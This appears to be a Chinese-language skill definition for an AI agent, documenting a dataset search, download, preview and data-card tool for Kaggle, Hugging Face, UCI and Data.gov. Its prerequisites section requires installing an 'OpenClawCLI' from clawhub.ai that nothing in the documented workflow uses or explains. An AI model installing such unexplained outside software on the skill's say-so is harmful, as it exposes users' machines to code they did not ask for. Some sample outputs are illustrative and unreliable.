---
name: dataset-finder
description: 当用户需要搜索数据集、下载数据文件或探索数据仓库时使用此技能。触发词包括：请求\"find datasets\"、\"search for data\"、\"download dataset from Kaggle\"、\"get data from Hugging Face\"、\"find ML datasets\"，或提及 Kaggle、UCI ML Repository、Data.gov、Hugging Face 等数据仓库。也用于预览数据集统计信息、生成数据卡片或发现机器学习项目所需的数据集。需要从 clawhub.ai 安装 OpenClawCLI。
license: Proprietary
tags:
- AI
- 搜索
---

# 数据集查找器

从多个仓库（包括 Kaggle、Hugging Face、UCI ML Repository 和 Data.gov）搜索、下载和探索数据集。预览统计信息、生成数据卡片，并管理机器学习项目所需的数据集。

⚠️ **前置条件：** 安装 [OpenClawCLI](https://clawhub.ai/)（Windows、MacOS）

**安装：**
```bash
# 标准安装
pip install kaggle datasets pandas huggingface-hub requests beautifulsoup4

# 如果遇到权限错误，请使用虚拟环境
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install kaggle datasets pandas huggingface-hub requests beautifulsoup4
```

**切勿使用 `--break-system-packages`**，因为它可能会损坏系统的 Python 安装。

---

## 快速参考

| 任务 | 命令 |
|------|---------|
| 搜索 Kaggle | `python scripts/dataset.py kaggle search "housing prices"` |
| 下载 Kaggle 数据集 | `python scripts/dataset.py kaggle download "username/dataset-name"` |
| 搜索 Hugging Face | `python scripts/dataset.py huggingface search "sentiment"` |
| 下载 HF 数据集 | `python scripts/dataset.py huggingface download "dataset-name"` |
| 搜索 UCI ML | `python scripts/dataset.py uci search "classification"` |
| 预览数据集 | `python scripts/dataset.py preview dataset.csv` |
| 生成数据卡片 | `python scripts/dataset.py datacard dataset.csv --output README.md` |
| 列出本地数据集 | `python scripts/dataset.py list` |

---

## 核心功能

### 1. 多仓库搜索

通过单一界面跨多个数据仓库进行搜索。

**支持的来源：**
- **Kaggle** - 机器学习竞赛和社区数据集
- **Hugging Face** - NLP、视觉和音频数据集
- **UCI ML Repository** - 经典机器学习数据集
- **Data.gov** - 美国政府开放数据
- **Local** - 管理已下载的数据集

### 2. 数据集下载

下载数据集并自动检测格式。

**支持的格式：**
- CSV, TSV
- JSON, JSONL
- Parquet
- Excel (XLSX, XLS)
- ZIP archives
- HDF5
- Feather

### 3. 数据集预览

无需加载整个数据集即可快速获取统计信息和洞察。

**预览功能：**
- 形状（行数 × 列数）
- 列名和类型
- 缺失值计数
- 基本统计（均值、标准差、最小值、最大值）
- 内存占用
- 样本行

### 4. 数据卡片生成

自动生成数据集文档。

**包含：**
- 数据集描述
- 模式信息
- 统计摘要
- 使用示例
- 许可证信息
- 引用详情

---

## 各仓库专属命令

### Kaggle

从 Kaggle 搜索和下载数据集。

**设置：**
1. 从 https://www.kaggle.com/settings 获取 Kaggle API 凭证
2. 将 `kaggle.json` 放置在 `~/.kaggle/`（Linux/Mac）或 `%USERPROFILE%\.kaggle\`（Windows）

```bash
# 搜索数据集
python scripts/dataset.py kaggle search "house prices"

# 带过滤条件的搜索
python scripts/dataset.py kaggle search "NLP" --file-type csv --sort-by hotness

# 下载数据集
python scripts/dataset.py kaggle download "zillow/zecon"

# 下载特定文件
python scripts/dataset.py kaggle download "username/dataset" --file "train.csv"

# 列出数据集文件
python scripts/dataset.py kaggle list "username/dataset-name"
```

**搜索选项：**
- `--file-type` - 按文件类型过滤（csv、json 等）
- `--license` - 按许可证类型过滤
- `--sort-by` - 按热度、投票、更新时间或相关性排序
- `--max-results` - 限制结果数量

**输出：**
```
1. House Prices - Advanced Regression Techniques
   Owner: zillow/zecon
   Size: 1.5 MB
   Last updated: 2023-06-15
   Downloads: 150,000+
   URL: https://www.kaggle.com/datasets/zillow/zecon

2. Housing Prices Dataset
   Owner: username/housing-data
   Size: 850 KB
   Last updated: 2023-08-20
   Downloads: 50,000+
   URL: https://www.kaggle.com/datasets/username/housing-data
```

### Hugging Face Datasets

从 Hugging Face Hub 搜索和下载数据集。

```bash
# 搜索数据集
python scripts/dataset.py huggingface search "sentiment analysis"

# 带过滤条件的搜索
python scripts/dataset.py huggingface search "NLP" --task text-classification --language en

# 下载数据集
python scripts/dataset.py huggingface download "imdb"

# 下载特定拆分
python scripts/dataset.py huggingface download "imdb" --split train

# 下载特定配置
python scripts/dataset.py huggingface download "glue" --config mrpc

# 流式传输大数据集
python scripts/dataset.py huggingface download "large-dataset" --streaming
```

**搜索选项：**
- `--task` - 按任务过滤（text-classification、translation 等）
- `--language` - 按语言代码过滤
- `--multimodal` - 包含多模态数据集
- `--benchmark` - 仅包含基准数据集
- `--max-results` - 限制结果数量

**输出：**
```
1. IMDB Movie Reviews
   Dataset ID: imdb
   Tasks: sentiment-classification
   Languages: en
   Size: 84.1 MB
   Downloads: 1M+
   URL: https://huggingface.co/datasets/imdb

2. Stanford Sentiment Treebank
   Dataset ID: sst2
   Tasks: sentiment-classification
   Languages: en
   Size: 7.4 MB
   Downloads: 500K+
   URL: https://huggingface.co/datasets/sst2
```

### UCI ML Repository

搜索和下载经典机器学习数据集。

```bash
# 搜索数据集
python scripts/dataset.py uci search "classification"

# 按特征搜索
python scripts/dataset.py uci search "regression" --min-samples 1000

# 下载数据集
python scripts/dataset.py uci download "iris"

# 下载并包含元数据
python scripts/dataset.py uci download "wine-quality" --include-metadata
```

**搜索选项：**
- `--task-type` - classification、regression、clustering
- `--min-samples` - 最小实例数
- `--min-features` - 最小特征数
- `--data-type` - tabular、text、image、time-series

**输出：**
```
1. Iris Dataset
   ID: iris
   Task: classification
   Samples: 150
   Features: 4
   Classes: 3
   Missing values: No
   URL: https://archive.ics.uci.edu/ml/datasets/iris

2. Wine Quality
   ID: wine-quality
   Task: classification/regression
   Samples: 6497
   Features: 11
   Missing values: No
   URL: https://archive.ics.uci.edu/ml/datasets/wine+quality
```

### Data.gov

搜索美国政府开放数据。

```bash
# 搜索数据集
python scripts/dataset.py datagov search "census"

# 按机构过滤搜索
python scripts/dataset.py datagov search "health" --organization "cdc.gov"

# 按主题搜索
python scripts/dataset.py datagov search "education" --tags "schools,students"

# 下载数据集
python scripts/dataset.py datagov download "dataset-id"
```

**搜索选项：**
- `--organization` - 按发布机构过滤
- `--tags` - 按标签过滤（逗号分隔）
- `--format` - 按格式过滤（csv、json、xml 等）
- `--max-results` - 限制结果数量

**输出：**
```
1. 2020 Census Demographic Data
   Organization: census.gov
   Format: CSV
   Size: 125 MB
   Last updated: 2023-01-15
   Tags: census, demographics, population
   URL: https://catalog.data.gov/dataset/...
```

---

## 数据集管理

### 预览数据集

无需加载整个数据集即可快速获取洞察。

```bash
# 基础预览
python scripts/dataset.py preview data.csv

# 详细统计
python scripts/dataset.py preview data.csv --detailed

# 自定义样本大小
python scripts/dataset.py preview data.csv --sample 20

# 多个文件
python scripts/dataset.py preview train.csv test.csv
```

**输出：**
```
Dataset: train.csv
Shape: 1000 rows × 15 columns
Size: 2.5 MB
Memory usage: 120 KB

Columns:
  - id (int64): no missing values
  - name (object): 5 missing values
  - age (int64): no missing values
  - income (float64): 12 missing values
  - category (object): no missing values

Numeric columns statistics:
           age       income
count   1000.0       988.0
mean      35.2     65432.1
std       12.5     25000.0
min       18.0     20000.0
max       75.0    150000.0

Categorical columns:
  - category: 5 unique values
  - name: 995 unique values

Sample (first 5 rows):
   id      name  age    income category
0   1  John Doe   35   65000.0        A
1   2  Jane Doe   28   55000.0        B
2   3  Bob Smith  42   85000.0        A
...
```

### 生成数据卡片

创建标准化的数据集文档。

```bash
# 生成数据卡片
python scripts/dataset.py datacard dataset.csv --output DATACARD.md

# 包含统计信息
python scripts/dataset.py datacard dataset.csv --include-stats --output README.md

# 自定义模板
python scripts/dataset.py datacard dataset.csv --template custom_template.md

# 多个数据集
python scripts/dataset.py datacard train.csv test.csv --output-dir datacards/
```

**生成的数据卡片包含：**
- 数据集描述
- 文件信息（大小、格式、行数、列数）
- 模式（列名、类型、描述）
- 统计（分布、缺失值、相关性）
- 样本数据
- 使用示例
- 许可证和引用
- 已知问题/限制

**示例输出 (DATACARD.md)：**
```markdown
# Dataset Card: Housing Prices

## Dataset Description
This dataset contains housing prices and features for regression analysis.

## Dataset Information
- **Format:** CSV
- **Size:** 1.2 MB
- **Rows:** 1,460
- **Columns:** 81

## Schema
| Column | Type | Description | Missing |
|--------|------|-------------|---------|
| Id | int64 | Unique identifier | 0 |
| MSSubClass | int64 | Building class | 0 |
| LotArea | int64 | Lot size in sq ft | 0 |
| SalePrice | int64 | Sale price | 0 |
...

## Statistics
- Numerical features: 38
- Categorical features: 43
- Missing values: 19 columns affected
- Target variable: SalePrice (range: $34,900 - $755,000)

## Usage
```python
import pandas as pd
df = pd.read_csv('housing_prices.csv')
```

## License
Creative Commons
```

### 列出本地数据集

管理已下载的数据集。

```bash
# 列出所有数据集
python scripts/dataset.py list

# 列出详细信息
python scripts/dataset.py list --detailed

# 按来源过滤
python scripts/dataset.py list --source kaggle

# 按大小过滤
python scripts/dataset.py list --min-size 100MB --max-size 1GB
```

**输出：**
```
Local Datasets (5 total, 2.5 GB):

1. zillow/zecon (Kaggle)
   Downloaded: 2024-01-15
   Size: 1.5 MB
   Files: train.csv, test.csv
   Location: datasets/kaggle/zillow/zecon/

2. imdb (Hugging Face)
   Downloaded: 2024-01-20
   Size: 84.1 MB
   Splits: train, test, unsupervised
   Location: datasets/huggingface/imdb/

3. iris (UCI ML)
   Downloaded: 2024-01-18
   Size: 4.5 KB
   Files: iris.data, iris.names
   Location: datasets/uci/iris/
```

---

## 常见工作流

### 机器学习项目搭建

为新的机器学习项目查找并下载数据集。

```bash
# 步骤 1：搜索相关数据集
python scripts/dataset.py kaggle search "house prices" --max-results 10 --output search_results.json

# 步骤 2：下载选定的数据集
python scripts/dataset.py kaggle download "zillow/zecon"

# 步骤 3：预览数据
python scripts/dataset.py preview datasets/kaggle/zillow/zecon/train.csv --detailed

# 步骤 4：生成文档
python scripts/dataset.py datacard datasets/kaggle/zillow/zecon/train.csv --output DATACARD.md
```

### NLP 项目数据集收集

为 NLP 任务收集文本数据集。

```bash
# 在 Hugging Face 上搜索情感数据集
python scripts/dataset.py huggingface search "sentiment" --task text-classification --language en

# 下载多个数据集
python scripts/dataset.py huggingface download "imdb"
python scripts/dataset.py huggingface download "sst2"
python scripts/dataset.py huggingface download "yelp_polarity"

# 预览每个数据集
python scripts/dataset.py list --source huggingface
```

### 数据集对比

对比多个数据集以进行选择。

```bash
# 跨仓库搜索
python scripts/dataset.py kaggle search "titanic" --output kaggle_results.json
python scripts/dataset.py uci search "classification" --output uci_results.json

# 预览候选数据集
python scripts/dataset.py preview candidate1.csv --output stats1.txt
python scripts/dataset.py preview candidate2.csv --output stats2.txt

# 生成对比数据卡片
python scripts/dataset.py datacard candidate1.csv candidate2.csv --output-dir comparison/
```

### 构建数据集库

为团队使用整理数据集。

```bash
# 创建结构化目录
mkdir -p datasets/{kaggle,huggingface,uci,custom}

# 下载数据集并附带元数据
python scripts/dataset.py kaggle download "dataset1" --output-dir datasets/kaggle/
python scripts/dataset.py huggingface download "dataset2" --output-dir datasets/huggingface/

# 为所有数据集生成数据卡片
python scripts/dataset.py datacard datasets/**/*.csv --output-dir datacards/

# 创建清单
python scripts/dataset.py list --detailed --output inventory.json
```

### 数据质量评估

在使用前评估数据集质量。

```bash
# 预览并查看详细统计
python scripts/dataset.py preview dataset.csv --detailed --output quality_report.txt

# 检查问题
python scripts/dataset.py validate dataset.csv --check-missing --check-duplicates --check-outliers

# 生成综合数据卡片
python scripts/dataset.py datacard dataset.csv --include-stats --include-quality --output QA_REPORT.md
```

---

## 高级功能

### 批量下载

一次性下载多个数据集。

```bash
# 创建下载列表
cat > datasets.txt << EOF
kaggle:zillow/zecon
kaggle:username/housing
huggingface:imdb
uci:iris
EOF

# 批量下载
python scripts/dataset.py batch-download datasets.txt --output-dir datasets/
```

### 数据集格式转换

在不同格式之间转换。

```bash
# CSV 转 Parquet
python scripts/dataset.py convert data.csv --format parquet --output data.parquet

# Excel 转 CSV
python scripts/dataset.py convert data.xlsx --format csv --output data.csv

# JSON 转 CSV
python scripts/dataset.py convert data.json --format csv --output data.csv
```

### 数据集拆分

为机器学习工作流拆分数据集。

```bash
# 训练/测试拆分
python scripts/dataset.py split data.csv --train 0.8 --test 0.2

# 训练/验证/测试拆分
python scripts/dataset.py split data.csv --train 0.7 --val 0.15 --test 0.15

# 分层拆分
python scripts/dataset.py split data.csv --stratify target_column --train 0.8 --test 0.2
```

### 数据集合并

合并多个数据集。

```bash
# 连接数据集
python scripts/dataset.py merge file1.csv file2.csv --output combined.csv

# 按键连接
python scripts/dataset.py merge left.csv right.csv --on id --how inner --output joined.csv
```

---

## 最佳实践

### 搜索策略

1. **先宽泛** - 先使用通用关键词
2. **迭代细化** - 根据结果添加过滤条件
3. **检查多个来源** - 不同仓库有不同优势
4. **查看元数据** - 下载前检查大小、格式、许可证

### 下载管理

1. **先检查大小** - 使用搜索查看数据集大小
2. **下载前预览** - 尽可能预览样本
3. **按来源组织** - 保持仓库结构清晰
4. **跟踪下载** - 使用 list 命令管理本地数据集

### 数据质量

1. **始终预览** - 使用前检查数据
2. **生成数据卡片** - 为所有数据集编写文档
3. **验证数据** - 检查缺失值、异常值
4. **保留元数据** - 保存原始描述和许可证

### 存储

1. **使用版本控制** - 跟踪数据集版本
2. **尽可能压缩** - 对大数据集使用 Parquet 或 HDF5
3. **定期清理** - 删除未使用的数据集
4. **备份重要数据** - 保留关键数据集的副本

---

## 故障排除

### 安装问题

**"缺少必需的依赖"**
```bash
# 安装所有依赖
pip install kaggle datasets pandas huggingface-hub requests beautifulsoup4

# 或使用虚拟环境
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

**"未找到 Kaggle API 凭证"**
1. 前往 https://www.kaggle.com/settings
2. 点击 "Create New API Token"
3. 将 `kaggle.json` 保存到：
   - Linux/Mac: `~/.kaggle/`
   - Windows: `%USERPROFILE%\.kaggle\`
4. 设置权限：`chmod 600 ~/.kaggle/kaggle.json`

**"需要 Hugging Face 认证"**
```bash
# 登录 Hugging Face
huggingface-cli login

# 或设置 token
export HF_TOKEN="your_token_here"
```

### 搜索问题

**"未找到结果"**
- 尝试更宽泛的搜索词
- 移除限制性过滤条件
- 检查拼写
- 尝试不同的仓库

**"搜索超时"**
- 检查网络连接
- 仓库可能暂时不可用
- 几分钟后重试

### 下载问题

**"下载失败"**
- 检查网络连接
- 验证数据集是否仍然存在
- 检查可用磁盘空间
- 尝试下载特定文件

**"权限被拒绝"**
- 某些数据集需要接受条款
- 可能需要 API 凭证
- 检查数据集许可证

**"内存不足"**
- 对大数据集使用流式传输
- 分块下载
- 使用 Parquet 替代 CSV

### 预览问题

**"无法加载数据集"**
- 检查文件格式
- 验证文件是否损坏
- 尝试指定编码：`--encoding utf-8`

**"预览太慢"**
- 使用更小的样本大小
- 仅预览前 N 行
- 使用格式专用工具

---

## 命令参考

```bash
python scripts/dataset.py <command> [OPTIONS]

COMMANDS:
  kaggle              Kaggle 操作（搜索、下载、列出）
  huggingface         Hugging Face 操作
  uci                 UCI ML Repository 操作
  datagov             Data.gov 操作
  preview             预览数据集统计信息
  datacard            生成数据集文档
  list                列出本地数据集
  batch-download      下载多个数据集
  convert             转换数据集格式
  split               为机器学习拆分数据集
  merge               合并数据集

KAGGLE:
  search QUERY        搜索 Kaggle 数据集
    --file-type       按文件类型过滤
    --license         按许可证过滤
    --sort-by         排序结果
    --max-results     限制结果数量
  
  download DATASET    下载 Kaggle 数据集
    --file            下载特定文件
    --output-dir      输出目录

HUGGING FACE:
  search QUERY        搜索 HF 数据集
    --task            按任务过滤
    --language        按语言过滤
    --max-results     限制结果数量
  
  download DATASET    下载 HF 数据集
    --split           特定拆分
    --config          配置
    --streaming       流式传输大数据集

UCI:
  search QUERY        搜索 UCI 数据集
    --task-type       按任务过滤
    --min-samples     最小样本数
  
  download DATASET    下载 UCI 数据集

PREVIEW:
  preview FILE        预览数据集
    --detailed        详细统计
    --sample N        样本大小

DATACARD:
  datacard FILE       生成数据卡片
    --output          输出文件
    --include-stats   包含统计信息
    --template        自定义模板

LIST:
  list                列出本地数据集
    --detailed        显示详情
    --source          按来源过滤

HELP:
  --help              显示帮助
```

---

## 按用例分类的示例

### 快速数据集搜索

```bash
# 查找房价数据集
python scripts/dataset.py kaggle search "housing"

# 查找 NLP 数据集
python scripts/dataset.py huggingface search "sentiment" --task text-classification

# 查找经典 ML 数据集
python scripts/dataset.py uci search "classification"
```

### 下载并预览

```bash
# 从 Kaggle 下载
python scripts/dataset.py kaggle download "zillow/zecon"

# 预览数据
python scripts/dataset.py preview datasets/kaggle/zillow/zecon/train.csv --detailed

# 生成文档
python scripts/dataset.py datacard datasets/kaggle/zillow/zecon/train.csv
```

### 多源搜索

```bash
# 搜索所有仓库
python scripts/dataset.py kaggle search "titanic" --output kaggle.json
python scripts/dataset.py huggingface search "titanic" --output hf.json
python scripts/dataset.py uci search "classification" --output uci.json

# 对比结果
cat kaggle.json hf.json uci.json
```

### 数据集管理

```bash
# 列出所有已下载数据集
python scripts/dataset.py list --detailed

# 预览多个数据集
python scripts/dataset.py preview *.csv

# 为所有数据集生成数据卡片
python scripts/dataset.py datacard *.csv --output-dir datacards/
```

---

## 支持

如有问题或疑问：
1. 查阅本文档
2. 运行 `python scripts/dataset.py --help`
3. 验证 API 凭证是否已设置
4. 查看仓库专属文档

**资源：**
- OpenClawCLI: https://clawhub.ai/
- Kaggle API: https://github.com/Kaggle/kaggle-api
- Hugging Face Datasets: https://huggingface.co/docs/datasets/
- UCI ML Repository: https://archive.ics.uci.edu/ml/
- Data.gov API: https://www.data.gov/developers/apis
